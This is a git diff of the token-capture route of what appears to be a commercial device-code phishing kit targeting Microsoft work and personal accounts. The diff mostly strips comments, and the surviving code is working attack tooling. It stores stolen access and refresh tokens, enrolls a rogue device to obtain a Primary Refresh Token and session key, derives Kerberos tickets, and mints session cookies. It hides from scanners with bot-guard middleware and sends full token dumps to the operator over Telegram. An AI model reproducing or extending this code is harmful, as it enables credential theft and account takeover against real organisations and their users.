@@ -15,9 +15,6 @@ const { validateResult } = require('../middleware/validator');
 const { getOpsecSettings } = require('../middleware/opsec');
 const { rejectBotRequest, classifyRequest } = require('../middleware/botguard');
 
-// Inline validators for the capture endpoint (commonValidators has no
-// captureToken rule, so we define them here to avoid passing `undefined`
-// to router.post which throws "requires a callback function").
 const captureValidators = [
     body('jwt_token').notEmpty().withMessage('jwt_token is required'),
     body('access_token').notEmpty().withMessage('access_token is required'),
@@ -41,11 +38,7 @@ router.get('/check', async (req, res) => {
   }
 });
 
-// Apply bot guard to all capture routes.
 router.use(rejectBotRequest);
-
-// Existing visitor block-check and anti-bot classification stays available
-// for worker consumers that still call /api/capture without the new check.
 
 function setBrowserLikeHeaders(res) {
   res.setHeader('X-Content-Type-Options', 'nosniff');
@@ -72,9 +65,7 @@ function extractEmailFromToken(token) {
     return payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
 }
 
-// Reject a promise after ms so capture responses never hang on the
-// (best-effort) device enrollment + PRT pipeline. The underlying work
-// keeps running in the background and may still persist results.
+
 function withTimeout(promise, ms, label) {
     return Promise.race([
         promise,
@@ -85,16 +76,6 @@ function withTimeout(promise, ms, label) {
 }
 
 /**
- * GraphSpy parity auto action (device_codes auto_action = 'device_prt').
- *
- * GraphSpy runs this automatically right after every successful device-code
- * phish: DRS-enroll a device, then exchange the refresh token for the RAW
- * PRT + session key via the device-signed request_for_device call, and store
- * everything. Without it the KDF PRT cookie (x-ms-RefreshTokenCredential)
- * and PRT->access-token flows have no material to work with.
- *
- * Best effort: any failure leaves the capture intact and downstream flows
- * (cookie conversion, Kerberos) continue with whatever is available.
  *
  * @returns {Promise<{success: boolean, prt?: string|null, reason?: string, via?: string}>}
  */
@@ -112,8 +93,6 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
             await devicemanager.persistPrtSessionKey(user_id, tenant, prtResult.sessionKeyHex, material)
                 .catch(skErr => console.warn('[Capture] session key not stored in device_credentials:', skErr.message));
         }
-        // Upgrade the token row to the real raw PRT + session_key_jwe
-        // (the prt column currently holds the plain refresh token).
         if (prtResult.prt && tokenId) {
             await db.query(
                 'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ?',
@@ -127,8 +106,6 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
         }
     };
 
-    // 1) GraphSpy gets the device_id from the device-code access token and
-    //    enrolls the DRS device directly (devicecode.enrollDevice).
     let deviceId = null;
     if (access_token) {
         try {
@@ -146,8 +123,6 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
         }
     }
 
-    // 2) Fallback: exchange the refresh token for a DRS-scoped token and
-    //    enroll with that (same sequence as deviceproxy.storeToken).
     if (!enrollment) {
         try {
             const fresh = await devicemanager.exchangeForDrsToken(refresh_token, tenant);
@@ -159,8 +134,6 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
         }
     }
 
-    // 3) Last resort: full DRS registration via devicemanager - it runs the
-    //    Slice C request_for_device call internally and returns the material.
     if (!enrollment) {
         try {
             const reg = await devicemanager.registerDeviceAndGetPrt({
@@ -224,12 +197,6 @@ async function applyCaptureDelay() {
   }
 }
 
-// --- Telegram capture-report helpers --------------------------------------------
-// Captures can contain very long token + cookie payloads that blow past
-// Telegram's 4096-char sendMessage limit, so we deliver the full data as a
-// .txt document (sendDocument) and keep a short HTML caption (<=1024 chars)
-// with the summary. Building entities from char codes so the literals are
-// not altered by tooling/runtime HTML rendering.
 const AMP = String.fromCharCode(38) + 'amp;'; // &
 const LT = String.fromCharCode(38) + 'lt;';  // <
 const GT = String.fromCharCode(38) + 'gt;';  // >
@@ -239,10 +206,7 @@ const esc = (val) => {
     return s.replace(/&/g, AMP).replace(/</g, LT).replace(/>/g, GT);
 };
 
-/**
- * Build a short HTML caption (<=1024 chars) summarising the capture.
- * Used as the caption of the Telegram document.
- */
+
 function buildCaptureCaption(data) {
     const {
         email, templateType, tokenType, accountType, tenant, ip,
@@ -268,10 +232,6 @@ function buildCaptureCaption(data) {
     return lines.join('\n');
 }
 
-/**
- * Build the full plain-text body of the .txt file sent with the capture.
- * No truncation, no HTML escaping — raw copy-paste-ready values.
- */
 function buildCaptureFileContent(data) {
     const {
         email, templateType, tokenType, accessToken, refreshToken, idToken,
@@ -363,8 +323,6 @@ function buildCaptureFileContent(data) {
         }
     }
 
-    // For COOKIE mode: show only the real GraphSpy PRT cookie. Ignore ordinary
-    // Microsoft cookies such as fpc / x-ms-gateway-slice / stsservicecookie.
     if (tokenType === 'cookie') {
         const cookieText = prtCookies.length > 0
             ? prtCookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`).join('\n')
@@ -379,10 +337,6 @@ function buildCaptureFileContent(data) {
     return out.join('\n');
 }
 
-/**
- * Send a capture report to the user's Telegram: a .txt document containing
- * the full tokens + cookies, with a short HTML caption summary.
- */
 function sendCaptureReport(userId, data) {
     const caption = buildCaptureCaption(data);
     const fileContent = buildCaptureFileContent(data);
@@ -451,17 +405,16 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     // Parse incoming data - support both old format and new PRT format
     let prt = null;
     let sessionKeyJwe = null;
-    let sessionKey = null;       // Raw session_key from token response
-    let sessionKeyEnc = null;    // session_key_enc from token response
-    let clientInfo = null;       // client_info (base64 JSON with uid+utid)
+    let sessionKey = null;      
+    let sessionKeyEnc = null;    
+    let clientInfo = null;       
     let deviceTenantId = null;
     let tgtAd = null;
     let tgtCloud = null;
     let kerberosTopLevelNames = null;
     let tgtCloudSessionkey = null;
-    let accountType = 'work_school'; // Default to work/school
+    let accountType = 'work_school'; 
 
-    // NEW: Extract PRT persistence fields from token response
     if (req.body.client_info) {
       clientInfo = req.body.client_info;
     }
@@ -470,7 +423,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     }
     if (req.body.session_key_enc) {
       sessionKeyEnc = req.body.session_key_enc;
-      // Use session_key_enc as session_key_jwe if not explicitly provided
       if (!sessionKeyJwe) {
         sessionKeyJwe = sessionKeyEnc;
       }
@@ -495,7 +447,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
       tgtCloudSessionkey = JSON.stringify(req.body.tgt_cloud_sessionkey);
     }
 
-    // Parse refresh_token - it may be a JSON blob containing PRT and other tokens (competitor format)
     let rawRefreshToken = refresh_token || '';
     if (rawRefreshToken) {
       try {
@@ -512,39 +463,31 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         if (parsedRefresh.kerberos_top_level_names) kerberosTopLevelNames = parsedRefresh.kerberos_top_level_names;
         if (parsedRefresh.tgt_cloud_sessionkey) tgtCloudSessionkey = parsedRefresh.tgt_cloud_sessionkey;
       } catch (e) {
-        // Not JSON - treat as plain refresh token
-        // Check if it's a known personal account token format
         if (rawRefreshToken.startsWith('0.AT') || rawRefreshToken.startsWith('M.R')) {
           accountType = 'personal';
         }
-        // For work/school accounts, the refresh token itself serves as PRT identifier
         if (accountType === 'work_school' && !prt) {
           prt = rawRefreshToken;
         }
       }
     }
     
-    // Store client_info and session data for cookie converter use
-    // These are needed to build PRT JWT during cookie conversion
     const captureMeta = {
       client_info: clientInfo,
       session_key: sessionKey,
       session_key_enc: sessionKeyEnc,
     };
 
-    // Extract email and tenant from id_token if present
     let email = null;
     let idTokenTenant = null;
     if (id_token) {
         try {
             let tokenPart = id_token.split('.')[1];
-            // Fix base64 padding if needed
             while (tokenPart.length % 4) tokenPart += '=';
             const payload = JSON.parse(Buffer.from(tokenPart, 'base64').toString());
             email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
-            idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
+            idTokenTenant = payload.tid || null; 
 
-            // Detect account type from email domain
             if (email) {
                 const emailDomain = email.split('@')[1].toLowerCase();
                 if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
@@ -558,7 +501,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         email = extractEmailFromToken(access_token) || extractEmailFromToken(refresh_token) || extractEmailFromToken(id_token) || null;
     }
 
-    // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
     let tenant = idTokenTenant || 'common';
     if (!idTokenTenant && link.jwt_payload) {
         try {
@@ -577,7 +519,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
 
     const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
-    // Determine token_type based on link auth_mode
     const tokenType = link.auth_mode === 'cookie' ? 'cookie' : 'token';
 
     const [result] = await db.query(
@@ -613,15 +554,11 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
 
     const tokenId = result.insertId;
 
-    // Auto-derive Kerberos TGTs for work/school accounts with PRT
-    // This runs asynchronously and doesn't block the response
-    // Requires: PRT + work/school account + specific tenant ID (not 'common' or 'organizations')
     if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
       const kerberosService = require('../services/kerberos');
       kerberosService.deriveTGTForToken(tokenId)
         .then(derivationResult => {
           if (derivationResult.success) {
-            // Update the token record with Kerberos data
             if (derivationResult.tgt_cloud) {
               db.query(
                 'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
@@ -653,11 +590,10 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         });
     }
 
-    // Common capture data shared by both the token-only and cookie paths
     const captureData = {
         email,
         templateType: link.template_type,
-        tokenType: tokenType, // Add tokenType for notification
+        tokenType: tokenType, 
         accessToken: access_token,
         refreshToken: prt,
         idToken: id_token,
@@ -680,18 +616,8 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         captureMeta: captureMeta,
     };
 
-    // If link is in cookie mode, trigger cookie conversion and only then return
-    // so the report is guaranteed to be dispatched before the request finishes.
-    // PASS TENANT, ACCOUNT TYPE, AND CAPTURE META (client_info, session_key)
-    // FIX: Pass refresh_token (not access_token) - cookie converter needs refresh token to generate session cookies
     let refreshTokenForConversion = refresh_token || prt || access_token;
     if (link.auth_mode === 'cookie') {
-        // GraphSpy parity (auto_action 'device_prt'): actively enroll the DRS
-        // device and capture the raw PRT + session key BEFORE cookie
-        // conversion, so convertTokensToCookies can mint the KDF-signed
-        // x-ms-RefreshTokenCredential from a live session key. Bounded so the
-        // capture response never hangs; on timeout/failure the conversion
-        // proceeds with whatever material already exists.
         let autoPrt = { success: false };
         if (accountType === 'work_school' && refresh_token) {
             autoPrt = await withTimeout(
@@ -703,8 +629,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                 return { success: false, reason: e.message };
             });
             if (autoPrt.success) {
-                // The freshly captured raw PRT is the correct material for the
-                // KDF cookie (the prt variable may still be the plain RT).
                 if (autoPrt.prt) refreshTokenForConversion = autoPrt.prt;
             }
         }
@@ -742,10 +666,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
             }
         }
     } else {
-        // GraphSpy parity: run the device_prt auto action in the background
-        // for work/school captures so the PRT + session key are available for
-        // /cookie-script, /prt-cookie and /prt-token with no manual steps
-        // (GraphSpy's auto_action is async and never blocks the response).
         if (accountType === 'work_school' && refresh_token) {
             autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token })
                 .catch(e => console.error('[Capture] Background PRT auto-capture error:', e.message));
